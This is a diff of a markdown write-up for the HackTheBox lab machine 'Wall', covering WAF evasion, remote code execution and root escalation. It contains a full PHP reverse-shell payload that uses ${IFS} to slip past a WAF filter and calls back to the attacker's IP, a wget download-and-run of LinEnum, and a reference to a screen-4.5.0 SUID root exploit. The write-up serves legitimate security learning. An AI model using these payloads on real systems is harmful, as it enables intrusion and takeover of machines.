@@ -1,8 +1,10 @@
 # HackTheBox: Wall.
 My write up for the recently retired HackTheBox machine: Wall!
+
 Wall was a fairly easy machine, although it was a little frustrating 
 
 The machine had a web application vulnerable to RCE, however it was (semi) protected by a WAF.
+
 Root access involved a vulrable SUID binary.
 
 ## In the beginning..
@@ -80,18 +82,21 @@ However it dosen't work. Why?
 
 ## WAF Evasion
 A Web Application Firewall is blocking my attempts. 
+
 I tested the WAF by hand, finding it results in status 403 when either 'nc' or ' ' (space character) were present.
 
 So to inject the command, these two could not be present.
 
 ## ${IFS}
 After some time studying at mhaskar's script, I decided to exploit using the GUI route.
+
 Instead of space, I used ${IFS} to escape the space char as well as a PHP exploit to bypass 'nc'.
 
 * [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [StackExchange]https://security.stackexchange.com/questions/198928/reverse-php-shell-disconnecting-when-netcat-listener
 
 I used those to craft a payload that results in status 200, then put the payload into Commands > Misc and bound it to the poller.
+
 Payload:
 ```
 php${IFS}-r${IFS}'$s=fsockopen("10.10.14.***",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
@@ -108,11 +113,15 @@ I got a shell!
 ## www-data
 
 Now I have a restricted shell - I need to perfrom some privilege escalation.
+
 I used LinEnum by running the following on my machine in the directory that LinEnum was in.
+
 ```
 $ python -m SimpleHTTPServer 8000
 ```
+
 And running the following on the target machine:
+
 ```
 & wget 10.10.14.***:8000/LinEnum.sh
 $ chmod +x LinEnum.sh
@@ -122,10 +131,12 @@ $ ./LinEnum.sh
 ## SUID PrivEsc
 
 LinEnum shows me a vulnerable SUID:
+
 ```
 -rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
 ```
 After a bit of research, I found an [exploit](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html)!
+
 With accompanying script: [screen2root](https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh).
 
 In the same way as before I run the script on the target machine:
